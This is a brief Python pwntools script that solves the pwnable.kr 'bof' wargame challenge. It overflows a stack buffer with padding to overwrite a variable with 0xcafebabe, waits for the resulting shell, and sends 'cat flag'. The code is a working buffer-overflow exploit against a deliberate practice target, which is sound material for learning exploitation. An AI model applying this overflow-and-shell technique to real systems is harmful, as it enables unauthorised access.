from pwn import *

r = remote('pwnable.kr', 9000)

# Stack buffers are often larger than what was requested in source.
r.send('A' * 0x2c)
r.send('EBP ')
r.send('EIP ')
r.sendline(p32(0xcafebabe))
#r.interactive()

# Spawning a shell takes a bit of time. If 'cat flag' is sent immediately,
# the shell won't actually get to consume it.
sleep(1)
r.sendline('cat flag')
print(r.recvline())
